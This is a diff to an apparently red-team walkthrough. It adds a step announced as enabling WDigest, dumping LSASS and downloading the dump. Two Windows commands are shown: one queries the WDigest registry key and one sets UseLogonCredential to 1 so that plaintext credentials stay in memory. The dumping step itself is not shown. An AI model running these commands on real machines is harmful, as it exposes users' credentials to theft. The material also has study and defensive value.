@@ -49,10 +49,22 @@
    ![image](https://github.com/user-attachments/assets/78176ea2-9843-480b-984c-b65e5ce7de80)
 
    
+   ### 2. Next step we are enabling wdigest then dumping LSASS then downloading it
+
+      a. is WDigest Enabled?
+
+      ```
+      reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+      ```
+
+      ![image](https://github.com/user-attachments/assets/b6029281-dae5-4253-a7c5-8d4365bcc295)
 
 
+      b. Let's Enable it
 
-
+      ```
+      Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
+      ```
 
 
 
